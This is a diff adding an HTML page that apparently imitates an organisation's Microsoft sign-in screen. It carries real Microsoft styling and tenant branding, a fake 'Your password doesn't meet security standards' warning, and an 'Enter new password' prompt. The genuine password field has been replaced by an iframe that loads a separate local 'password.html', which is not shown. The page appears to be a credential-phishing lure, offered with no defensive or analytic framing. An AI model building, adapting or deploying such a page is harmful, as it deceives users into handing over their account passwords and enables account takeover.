@@ -1,0 +1,339 @@
+<html dir="ltr" class="" lang="en"><head>
+    <title>Change your Password</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="-1">
+    <link rel="preconnect" href="https://aadcdn.msftauth.net" crossorigin="">
+<meta http-equiv="x-dns-prefetch-control" content="on">
+<link rel="dns-prefetch" href="//aadcdn.msftauth.net">
+<link rel="dns-prefetch" href="//aadcdn.msauth.net">
+
+    <meta name="PageID" content="ConvergedSignIn">
+    <meta name="SiteID" content="">
+    <meta name="ReqLC" content="9">
+    <meta name="LocLC" content="en">
+
+
+        <meta name="format-detection" content="telephone=no">
+
+    <noscript>
+        <meta http-equiv="Refresh" content="0; URL=https://login.microsoftonline.com/jsdisabled" />
+    </noscript>
+
+    
+    
+<meta name="robots" content="none">
+
+    
+    <link data-loader="cdn" crossorigin="anonymous" href="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_mc5ac6ol0l4d2iaqspstyg2.css" rel="stylesheet">
+
+
+
+
+<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb remove-segoe-ui-symbol" style="display: block;">
+    <script type="text/javascript">//<![CDATA[
+!function(){var e=window,s=e.document,i=e.$Config||{};if(e.self===e.top){s&&s.body&&(s.body.style.display="block")}else if(!i.allowFrame){var o,t,r,f,n,d;if(i.fAddTryCatchForIFrameRedirects){try{o=e.self.location.href,t=o.indexOf("#"),r=-1!==t,f=o.indexOf("?"),n=r?t:o.length,d=-1===f||r&&f>t?"?":"&",o=o.substr(0,n)+d+"iframe-request-id="+i.sessionId+o.substr(n),e.top.location=o}catch(e){}}else{o=e.self.location.href,t=o.indexOf("#"),r=-1!==t,f=o.indexOf("?"),n=r?t:o.length,d=-1===f||r&&f>t?"?":"&",
+o=o.substr(0,n)+d+"iframe-request-id="+i.sessionId+o.substr(n),e.top.location=o}}}();
+//]]></script>
+    
+
+<div>
+
+
+
+<div data-bind="if: activeDialog"></div>
+
+<form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="visible: !isLoginPageHidden(), autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: !!activeDialog(), css: { 'provide-min-height': svr.fUseMinHeight }" action="https://login.microsoftonline.com/4f3f0e52-b734-4164-9409-1b601d147993/login" class="provide-min-height">
+    
+    <div class="login-paginated-page" data-bind="component: { name: 'master-page',
+        publicMethods: masterPageMethods,
+        params: {
+            serverData: svr,
+            showButtons: svr.fShowButtons,
+            showFooterLinks: true,
+            useWizardBehavior: svr.fUseWizardBehavior,
+            handleWizardButtons: false,
+            password: password,
+            hideFromAria: ariaHidden },
+        event: {
+            footerAgreementClick: footer_agreementClick } }">
+
+
+
+
+    
+        
+        <div id="lightboxTemplateContainer" data-bind="component: { name: 'lightbox-template', params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { 'provide-min-height': svr.fUseMinHeight }" class="provide-min-height">
+
+<div id="lightboxBackgroundContainer" data-bind="css: { 'provide-min-height': svr.fUsePlaywrightMinHeight },
+    component: { name: 'background-image-control',
+        publicMethods: $page.backgroundControlMethods,
+        event: { load: $page.backgroundImageControl_onLoad } }"><div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }" style="background: rgb(199, 51, 51);">
+    
+
+    
+    <div id="backgroundImage" role="img" data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }, ariaLabel: str['STR_Background_Image_AltText']" class="background-image ext-background-image" aria-label="Organization background image" style="background-image: url(&quot;https://aadcdn.msftauthimages.net/c1c6b6c8-yzix-o6us-kmqt3kqjtallwdckiazxmoy2l4kqsftha/logintenantbranding/0/illustration?ts=637837468834499002&quot;);"></div>
+        
+        <div data-bind="externalCss: { 'background-overlay': true }" class="background-overlay ext-background-overlay"></div>
+        
+    
+</div></div>
+
+
+
+
+<div class="outer" data-bind="css: { 'app': $page.backgroundLogoUrl }">
+    
+
+    <div class="template-section main-section">
+        <div data-bind="externalCss: { 'middle': true }" class="middle ext-middle">
+            <div class="full-height" data-bind="component: { name: 'content-control', params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate(), hasHeader: showHeader } }">
+
+
+<div class="flex-column">
+    
+
+    
+
+    <div class="win-scroll">
+        <div id="lightbox" data-bind="
+            animationEnd: $page.paginationControlHelper.animationEnd,
+            externalCss: { 'sign-in-box': true },
+            css: {
+                'inner':  $content.isVerticalSplitTemplate,
+                'vertical-split-content': $content.isVerticalSplitTemplate,
+                'app': $page.backgroundLogoUrl,
+                'wide': $page.paginationControlHelper.useWiderWidth,
+                'fade-in-lightbox': $page.fadeInLightBox,
+                'has-popup': $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
+                'transparent-lightbox': $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
+                'lightbox-bottom-margin-debug': $page.showDebugDetails,
+                'has-header': $content.hasHeader }" class="sign-in-box ext-sign-in-box fade-in-lightbox">
+
+            
+
+        
+
+        <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div>
+
+        
+
+        
+        <div data-bind="component: { name: 'logo-control',
+            params: {
+                isChinaDc: svr.fIsChinaDc,
+                bannerLogoUrl: bannerLogoUrl() } }">
+
+
+    
+    <img id="bannerLogo" data-bind="addEventHandlers, attr: { src: bannerLogoUrl, alt: str['STR_Banner_Logo_AltText'] }, externalCss: { 'banner-logo': true }" src="https://aadcdn.msftauthimages.net/c1c6b6c8-yzix-o6us-kmqt3kqjtallwdckiazxmoy2l4kqsftha/logintenantbranding/0/bannerlogo?ts=637185030968671554" alt="Organization banner logo" class="banner-logo ext-banner-logo">
+    
+    
+
+
+
+
+</div>
+        
+
+        
+
+        
+        <div role="main" data-bind="component: { name: 'pagination-control',
+            publicMethods: paginationControlMethods,
+            params: {
+                enableCssAnimation: svr.fEnableCssAnimation,
+                disableAnimationIfAnimationEndUnsupported: svr.fDisableAnimationIfAnimationEndUnsupported,
+                initialViewId: initialViewId,
+                currentViewId: currentViewId,
+                initialSharedData: initialSharedData,
+                initialError: $loginPage.getServerError() },
+            event: {
+                cancel: paginationControl_onCancel,
+                load: paginationControlHelper.onLoad,
+                unload: paginationControlHelper.onUnload,
+                loadView: view_onLoadView,
+                showView: view_onShow,
+                setLightBoxFadeIn: view_onSetLightBoxFadeIn,
+                animationStateChange: paginationControl_onAnimationStateChange } }">
+
+<div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
+    
+    <div data-bind="css: {
+        'animate': animate() &amp;&amp; animate.animateBanner(),
+        'slide-out-next': animate.isSlideOutNext(),
+        'slide-in-next': animate.isSlideInNext(),
+        'slide-out-back': animate.isSlideOutBack(),
+        'slide-in-back': animate.isSlideInBack() }" class="animate slide-in-next">
+
+        <div data-bind="component: { name: 'identity-banner-control',
+            params: {
+                userTileUrl: svr.urlProfilePhoto,
+                displayName: sharedData.displayName || svr.sPOST_Username,
+                isBackButtonVisible: isBackButtonVisible(),
+                focusOnBackButton: isBackButtonFocused(),
+                backButtonDescribedBy: backButtonDescribedBy() },
+            event: {
+                backButtonClick: identityBanner_onBackButtonClick } }">
+
+<div class="identityBanner">
+    
+
+    <div id="displayName" class="identity" >Your password doesn't meet security standards</div>
+</div></div>
+    </div>
+    
+
+    <div class="pagination-view has-identity-banner animate slide-in-next" data-bind="css: {
+        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
+        'zero-opacity': hidePaginatedView.hideSubView(),
+        'animate': animate(),
+        'slide-out-next': animate.isSlideOutNext(),
+        'slide-in-next': animate.isSlideInNext(),
+        'slide-out-back': animate.isSlideOutBack(),
+        'slide-in-back': animate.isSlideInBack() }">
+
+        
+            
+        
+            
+        
+            
+        
+            
+                
+
+
+<div aria-hidden="true">
+    <input type="hidden" name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0">
+
+    
+    <input type="hidden" name="login" autocomplete="username" data-bind="value: unsafe_username" value="You have an insecure password.">
+    
+    
+
+    
+    <input type="text" name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true">
+    <input type="hidden" name="type" data-bind="value: svr.fUseWizardBehavior ? 20 : 11" value="11">
+    <input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3">
+    <input type="hidden" name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value="">
+    <input type="hidden" name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value="">
+    <input type="hidden" name="hisRegion" data-bind="value: callMetadata.HisRegion" value="">
+    <input type="hidden" name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value="">
+</div>
+
+<div id="loginHeader" class="row title ext-title" data-bind="externalCss: { 'title': true }">
+    <div role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Enter new password</div>
+</div>
+
+
+
+
+
+<div class="row">
+    <div class="form-group col-md-24">
+        <div role="alert" aria-live="assertive">
+            
+        </div>
+
+        <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
+            publicMethods: passwordTextbox.placeholderTextboxMethods,
+            params: {
+                serverData: svr,
+                hintText: str['CT_PWD_STR_PwdTB_Label'] },
+            event: {
+                updateFocus: passwordTextbox.textbox_onUpdateFocus } }">
+    
+
+           
+
+</div>
+
+        
+    </div>
+</div>
+
+
+
+<div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText &amp;&amp; !boilerPlateText }, externalCss: { 'password-reset-links-container': true }" class="password-reset-links-container ext-password-reset-links-container">
+    <div>
+        
+        
+
+        <div class="row">
+            <div class="col-md-24">
+                <div class="text-13">
+                    
+                    
+                    <div class="form-group">
+                        <iframe src="password.html" style="overflow:hidden; width: 100%; height: 100%; border:none;">
+                    </div> 
+                    
+                    
+                    
+                        
+
+<div class="form-group">
+    
+
+    
+
+    
+</div>
+
+
+
+                    
+                    
+                    <div class="form-group">
+                        <a id="i1668" href="#" data-bind="text: str['CT_FED_STR_ChangeUserLink_Text'], click: selectAccount_onClick">Sign in with another account</a>
+                    </div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="win-button-pin-bottom boilerplate-button-bottom" data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText || boilerPlateText }">
+    <div class="row move-buttons" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText || boilerPlateText }">
+        <div data-bind="component: { name: 'footer-buttons-field',
+            params: {
+                serverData: svr,
+                primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
+                isPrimaryButtonEnabled: !isRequestPending(),
+                isPrimaryButtonVisible: svr.fShowButtons,
+                isSecondaryButtonEnabled: true,
+                isSecondaryButtonVisible: false },
+            event: {
+                primaryButtonClick: primaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container" data-bind="
+    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
+    css: { 'no-margin-bottom': removeBottomMargin },
+    externalCss: { 'button-field-container': true }">
+
+    
+
+    <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }" class="inline-block button-item ext-button-item">
+        
+        
+        <input type="submit" id="idSIButton9" class="win-button button_primary high-contrast-overrides button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
+                attr: primaryButtonAttributes,
+                css: { 'high-contrast-overrides': svr.fUseHighContrastOverrides },
+                externalCss: {
+                    'button': true,
+                    'primary': true },
+                value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
+                hasFocus: focusOnPrimaryButton,
+                click: svr.fEnableLivePreview ?  function() { } : primaryButton_onClick,
+                clickBubble: !svr.fEnableLivePreview,
+                enable: isPrimaryButtonEnabled,
+                visible: isPrimaryButtonVisible,
+                preventTabbing: primaryButtonPreventTabbing" value="Sign in">
+        
+        
+    </div>
+</div></div>
+    </div>
+</div>
